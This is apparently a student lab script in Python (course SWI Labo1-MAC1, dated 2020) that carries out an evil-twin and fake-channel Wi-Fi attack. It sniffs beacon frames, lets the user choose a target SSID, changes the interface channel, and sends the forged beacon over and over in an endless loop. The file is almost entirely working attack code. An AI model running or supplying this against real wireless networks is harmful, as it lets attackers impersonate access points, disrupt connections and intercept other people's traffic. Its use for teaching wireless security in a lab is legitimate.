# -*- coding: utf-8 -*-

# SWI - Labo1-MAC1
# Date: 02.03.2020
# File: evil-twin-fake-channel.py
# Students: Stefan Dejanovic, Nathanael Mizutani

# Sources: - https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
#          - https://stackoverflow.com/questions/56644291/trying-to-retrieve-channel-from-802-11-frame-with-scapy
#          - https://github.com/Esser420/EvilTwinFramework
#          - https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
#          - https://stackoverflow.com/questions/29817417/scapy-insert-packet-layer-between-two-other-layers
#          - Victor Truan, Edin Mujkanovic

# Evil twin and fake channel attack
from scapy.all import *
import os

if len(sys.argv) != 2:
    print("Usage: evil-twin-fake-channel.py <interface>")
    exit()

# SSID sniffer
# Based on the code of Adam Ziaja's ssid-sniffer.py (https://github.com/adamziaja/python/blob/master/ssid_sniffer.py)
ssid_list =  [] # List of the ssid in the vicinity
interface = sys.argv[1] # The interface is passed as argument

def packetHandler(pkt):
    if pkt.haslayer(Dot11Beacon): # 802.11 beacon packets
        try:
            # We make sure to have neither duplicates, nor empty packets in the ssid list
            if(pkt.info not in ssid_list and len(pkt.info) > 0):
                ssid_list.append(pkt)
                print("Scanning...")
                
        except AttributeError as e:
                print(e)
                return

# iface: interface to use
# count: number of packet to sniff, 0 is infinity
# prn: callback function
# store: number of packet to store in memory
# timeout: sniffing duration in seconds
sniff(iface=interface, count=0, prn=packetHandler, store=0, timeout=2)

# We print the list of retrieved ssids
print("#-------------------------#")
for i in range(len(ssid_list)):
    print(str(i) + ' - ' + str(ssid_list[i].info) + ' : ' + str(ssid_list[i].dBm_AntSignal) + 'dBm')
print("#-------------------------#")

# We ask the user to choose the network to attack
target = int(input("Select a ssid: "))

try:
    # We trust the user to only input a number
    target_pkt = ssid_list[target]

    print("You choose " + str(target_pkt.info))

    # We retrieve the end of the packet
    payload = target_pkt.getlayer(6)

    # We retrieve the target channel
    target_channel = target_pkt[Dot11Beacon].network_stats().get("channel")
    print("Target channel: " + str(target_channel))

    # We define a new channel for the beacons
    if(target_channel > 7):
        new_ch = target_channel - 6
    else:
        new_ch = target_channel + 6

    print("New Channel " + str(new_ch))

    os.system(f"iwconfig {interface} channel {new_ch}")

    # We forge a new beacon based on the one we captured
    packet = target_pkt
    packet[Dot11Elt:3] = Dot11Elt(ID="DSset", info=chr(new_ch))

    frame = packet/payload

    input("\nPress enter to send\n")
    
    sendp(frame,count=100, iface=interface, inter=0.1, loop=1)
    
except Exception as ex:
    print(ex)